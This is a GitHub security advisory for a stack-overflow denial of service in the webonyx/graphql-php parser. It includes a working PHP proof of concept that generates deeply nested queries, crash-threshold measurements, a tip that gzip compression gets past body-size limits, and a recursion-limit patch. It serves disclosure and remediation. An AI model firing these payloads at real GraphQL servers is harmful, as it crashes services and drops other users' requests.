# [H] webonyx/graphql-php has unbounded recursion in parser that causes stack overflow on crafted nested input

## Summary
Severity: High
Advisory: GHSA-r7cg-qjjm-xhqq
CWE: CWE-674
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-r7cg-qjjm-xhqq
Type: github-advisory

## Affected
- Packagist: `webonyx/graphql-php` — affected >=0 <15.32.3

## Details
## Summary

`GraphQL\Language\Parser` is a recursive descent parser with no recursion depth limit and no `zend.max_allowed_stack_size` interaction. Crafted nested queries trigger a SIGSEGV in the PHP runtime, killing the FPM/CLI worker process. Smallest crashing payload is approximately 74 KB.

## Affected Component

- `src/Language/Parser.php` -- the `Parser` class (no recursion depth tracking)
- `src/Language/Lexer.php` -- the `Lexer` class

## Severity

**HIGH (8.2)** -- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H

Integrity is Low because the entire PHP process (FPM worker, CLI process, Swoole worker, RoadRunner worker, etc.) is terminated by SIGSEGV. Every concurrent request handled by the same process is dropped along with the attacker's request, with no error message, no log entry, and no recovery path beyond restart. The 74 KB minimum crashing payload sits well below any common HTTP body size limit, and the failure mode is **the worst possible**: not catchable, not observable, no diagnostics.

## Description

`GraphQL\Language\Parser` parses GraphQL documents using mutually recursive PHP methods (`parseValueLiteral`, `parseObject`, `parseObjectField`, `parseList`, `parseSelectionSet`, `parseSelection`, `parseField`, `parseTypeReference`, `parseInlineFragment`). The constructor (`Parser.php:325`) accepts only three options:

```php
// src/Language/Parser.php:64
/**
 * @phpstan-type ParserOptions array{
 *   noLocation?: bool,
 *   allowLegacySDLEmptyFields?: bool,
 *   allowLegacySDLImplementsInterfaces?: bool,
 * }
 */
```

There is **no `maxTokens`, no `maxDepth`, no `maxRecursionDepth`, no token counter, and no recursion depth counter** anywhere in the parser or lexer. PHP recursion is bounded only by the C stack size (typically 8 MB via `ulimit -s 8192`).

When the C stack is exhausted by graphql-php's recursive parser, **PHP segfaults**. The PHP 8.3 runtime ships with `zend.max_allowed_stack_size` (default 0 = auto-detect), which is supposed to convert userland recursion overflow into a catchable `Stack overflow detected` error. **In practice, this protection does not catch the graphql-php parser overflow**: testing with PHP 8.3.30 in default Docker configuration, every crashing depth produces SIGSEGV (exit code 139), not a catchable error.

This finding has been tested against the **latest stable release `webonyx/graphql-php@v15.31.4`** running on PHP 8.3.30.

## Root Cause

```php
// src/Language/Parser.php:168
class Parser
{
    // ... no recursionDepth field ...
    private Lexer $lexer;

    // src/Language/Parser.php:325
    public function __construct($source, array $options = [])
    {
        $sourceObj = $source instanceof Source
            ? $source
            : new Source($source);
        $this->lexer = new Lexer($sourceObj, $options);
    }
```

There is no field tracking recursion depth. Every recursive parse method calls itself without bound. PHP function call frames are small (~256 bytes each), but the cumulative depth needed by recursive descent for a GraphQL value literal exhausts an 8 MB stack at approximately 26,000-37,000 levels of input nesting (depending on the call chain depth per AST level).

## Proof of Concept

```php
// composer require webonyx/graphql-php:v15.31.4
<?php
require __DIR__.'/vendor/autoload.php';
use GraphQL\Language\Parser;

// Each invocation tests one (vector, depth) pair so we can observe per-process
// exit code. SIGSEGV cannot be caught by PHP try/catch.
$v = $argv[1]; $d = (int)$argv[2];

switch ($v) {
    case 'A': $q = "{ a(x: " . str_repeat('{a: ', $d) . '1' . str_repeat('}', $d) . ") }"; break;
    case 'B': $q = str_repeat('{ a', $d) . str_repeat(' }', $d); break;
    case 'C': $q = "{ a(x: " . str_repeat('[', $d) . '1' . str_repeat(']', $d) . ") }"; break;
    case 'D': $q = "query(\$v: " . str_repeat('[', $d) . "Int" . str_repeat(']', $d) . ") { a }"; break;
}

try {
    Parser::parse($q);
    echo "OK depth=$d size=" . strlen($q) . "\n";
} catch (\Throwable $e) {
    echo "ERR " . get_class($e) . ": " . substr($e->getMessage(), 0, 80) . "\n";
    exit(1);
}
```

### Crash thresholds measured on `webonyx/graphql-php@v15.31.4`, PHP 8.3.30, ulimit -s 8192, Linux x86_64

Each vector was bisected to find the smallest crashing depth. Process exit code 139 = 128 + SIGSEGV (11).

| Vector | Recursive call chain | last_OK_depth | crash_depth | Crash payload size |
|--------|----------------------|---:|---:|---:|
| A: nested object values `{a:{a:..}}` | `parseValueLiteral` -> `parseObject` -> `parseObjectField` -> `parseValueLiteral` | 25,781 | **26,250** | ~129 KB |
| B: nested selection sets `{a{a{..}}}` | `parseSelectionSet` -> `parseSelection` -> `parseField` -> `parseSelectionSet` | 25,781 | **26,250** | ~129 KB |
| C: nested list values `[[..1..]]` | `parseValueLiteral` -> `parseList` -> `parseValueLiteral` | 37,187 | **37,500** | **~74 KB** |
| D: nested list types `[[Int]]` | `parseTypeReference` -> `parseTypeReference` | 87,187 | **87,500** | ~174 KB |

The smallest reliable crashing payload is **vector C (nested list values) at approximately 74 KB**. All four vectors stay under any field, complexity, or depth validation rule because they crash at parse time, before validation runs.

### Process exit observed

```
$ php -d xdebug.mode=off poc_one.php C 37500
$ echo $?
139
$
```

Standard error contains no PHP error message, no stack trace, no log entry. The process is killed by the kernel via SIGSEGV. In a php-fpm deployment, the FPM master logs `WARNING: [pool www] child 12345 exited on signal 11 (SIGSEGV)` and respawns the worker, dropping any in-flight requests on that worker.

### `zend.max_allowed_stack_size` does not help

PHP 8.3 introduced `zend.max_allowed_stack_size` (default 0 = auto-detect from `pthread_attr_getstacksize`) to detect userland recursion overflow and raise a catchable `Stack overflow detected` error. In testing against graphql-php v15.31.4, this protection does **not** prevent the segfault:

```
=== Default settings ===
$ php -d xdebug.mode=off poc.php A 30000
Segmentation fault
EXIT=139

=== zend.max_allowed_stack_size=2M ===
$ php -d zend.max_allowed_stack_size=2097152 poc.php A 30000
Segmentation fault
EXIT=139

=== zend.max_allowed_stack_size=1M, reserved=128K ===
$ php -d zend.max_allowed_stack_size=1048576 -d zend.reserved_stack_size=131072 poc.php A 30000
Segmentation fault
EXIT=139

=== ulimit -s 4096, default zend settings ===
$ php -d xdebug.mode=off poc.php A 15000
Segmentation fault
EXIT=139
```

Every configuration tested produces SIGSEGV. The runtime check is not catching this overflow class, possibly because the per-frame stack consumption is below the per-call check granularity, or because the auto-detection of the available stack diverges from the actual `ulimit -s` in containerized environments. Either way, default PHP 8.3 configurations as shipped by official Docker images do not protect against this.

## Why try/catch cannot help

PHP's `try { Parser::parse($q); } catch (\Throwable $e) { ... }` cannot catch SIGSEGV. The signal is delivered by the kernel after the C stack pointer crosses the guard page; the PHP runtime never gets a chance to raise a userland exception. The process exits with status 139 and the `catch` block is never entered.

## Impact

- **Process termination**: a single 74 KB POST kills the entire PHP process that handles it. In php-fpm, the worker is killed and respawned by the master; every other in-flight request on that worker is dropped. In long-running PHP runtimes (Swoole, RoadRunner, ReactPHP), the entire daemon dies.
- **Pre-validation**: `Parser::parse` is invoked before any validation rule. Field count caps, complexity analyzers, persisted query allow-lists, and all custom validators run after parsing and therefore cannot intercept the crash.
- **No catchable error**: unlike a slow query, a memory_limit exceeded, or a parse error, SIGSEGV cannot be intercepted by PHP. There is no error log entry from the PHP application; only the FPM master log shows `child exited on signal 11`.
- **Tiny payload**: 74 KB is well below every common HTTP body size limit. The query is also extremely compressible: `[` repeated 37,500 times compresses to a few hundred bytes via gzip, bypassing nginx `client_max_body_size`, AWS ALB body-size caps, and WAF inspection of the encoded payload.
- **Ecosystem reach**: webonyx/graphql-php is the parser used by **Lighthouse** (Laravel), **Overblog/GraphQLBundle** (Symfony), **wp-graphql** (WordPress), **Drupal GraphQL module**, and the majority of PHP GraphQL servers. Any of these is exposed unless the front layer rejects the decompressed payload before reaching the parser.

## Affected Versions

- **`webonyx/graphql-php@v15.31.4`** (latest stable as of 2026-04-08): all four vectors confirmed by direct measurement.
- The recursive descent design has been unchanged since the parser was rewritten in v15.x. Earlier 15.x and 14.x releases share the same code path and are believed vulnerable but were not retested individually.

## Remediation

### Option 1 -- Add a parser-level recursion depth counter (recommended)

Add a `recursionDepth` and `maxRecursionDepth` field to `GraphQL\Language\Parser`. Increment at the entry of each recursive method, decrement on return, and throw a `SyntaxError` when it exceeds the configured limit. A sensible default is 256: well above any realistic legitimate query, and approximately 100x below the smallest current crash threshold.

```php
// src/Language/Parser.php
class Parser
{
    private int $recursionDepth = 0;
    private int $maxRecursionDepth;

    public function __construct($source, array $options = [])
    {
        $this->maxRecursionDepth = $options['maxRecursionDepth'] ?? 256;
        // ... existing body ...
    }

    private function parseValueLiteral(bool $isConst): ValueNode
    {
        if (++$this->recursionDepth > $this->maxRecursionDepth) {
            throw new SyntaxError(
                $this->lexer->source,
                $this->lexer->token->start,
                "Document exceeds maximum allowed recursion depth of {$this->maxRecursionDepth}."
            );
        }
        try {
            // ... existing body ...
        } finally {
            --$this->recursionDepth;
        }
    }
}
```

Apply the same pattern to `parseSelectionSet`, `parseObject`, `parseObjectField`, `parseList`, `parseTypeReference`, `parseInlineFragment`, and `parseField`. The thrown `SyntaxError` is a normal PHP exception and is fully catchable by user code.

### Option 2 -- Iterative parsing for the deepest call chains

Rewrite `parseValueLiteral` / `parseObject` / `parseList` and `parseTypeReference` using an explicit work stack instead of mutual recursion. This removes the call frame budget entirely for those vectors but does not address `parseSelectionSet`, which is harder to convert.

### Option 3 -- Recommend a token limit option in addition to depth

graphql-php currently has **no token limit option at all**. Adding a `maxTokens` parser option would provide defense in depth even if the recursion limit is misconfigured.

The strongest fix is Option 1 with a non-zero default for `maxRecursionDepth`.

## Audit status of related parser-side findings on graphql-php 15.31.4

The following two related parser/validator findings were tested against `webonyx/graphql-php@v15.31.4`.

### Token-limit comment bypass

**Not applicable**: graphql-php exposes **no `maxTokens` option of any kind**. The bypass class does not apply because there is no token counter to bypass. However, this is itself a finding worth documenting: graphql-php has **no parser-side resource limits whatsoever**. A 391 KB comment-padded payload (100,000 comment lines) is parsed in 193 ms with a +18.4 MB heap delta, with no upper bound. Operators relying on graphql-php as their primary line of defense have no parser-level mitigation against query-size DoS, only the global `memory_limit` and PHP's `post_max_size`.

The `Lexer::lookahead` method does loop while `$token->kind === Token::COMMENT` (so comments are silently consumed before any per-token check would run), but in graphql-php this is moot because there is no `maxTokens` counter to bypass in the first place.

### `OverlappingFieldsCanBeMerged` validation DoS

graphql-php **is** vulnerable. `src/Validator/Rules/OverlappingFieldsCanBeMerged.php:311` contains an `O(n^2)` pairwise loop, and inline fragments are flattened into the same `$astAndDefs` map at line 266 (`case $selection instanceof InlineFragmentNode: $this->internalCollectFieldsAndFragmentNames(... $astAndDefs ...)`), bypassing the named-fragment cache. Measured validation cost: 117 seconds for a 364 KB query (200 outer x 100 inner inline fragments). This is documented in a separate advisory: see `GHSA_REPORT_GRAPHQL_PHP_15-31-4_OVERLAPPING_FIELDS.md`.

This audit covers the three parser-side and validation-side findings tracked together for this implementation. The parser stack overflow documented above and the `OverlappingFieldsCanBeMerged` validation DoS are exploitable on graphql-php 15.31.4; the token-limit comment bypass is not applicable because there is no token limit option to bypass (which is itself a defense-in-depth gap).

## Resources

- PHP documentation [`zend.max_allowed_stack_size`](https://www.php.net/manual/en/ini.core.php#ini.zend.max-allowed-stack-size) -- introduced in PHP 8.3
- Linux signal(7) -- SIGSEGV (signal 11) is delivered by the kernel for invalid memory access; PHP cannot intercept it
- Companion advisory for this implementation: `OverlappingFieldsCanBeMerged` quadratic validation DoS via flattened inline fragments (Quadratic validation cost in OverlappingFieldsCanBeMerged via inline fragments).

## References
- https://github.com/webonyx/graphql-php/security/advisories/GHSA-r7cg-qjjm-xhqq
- https://github.com/webonyx/graphql-php/commit/7b7f2080ca5f7d5340a696fc5701b19a9222d2c2
- https://github.com/webonyx/graphql-php
- https://github.com/webonyx/graphql-php/releases/tag/v15.32.3
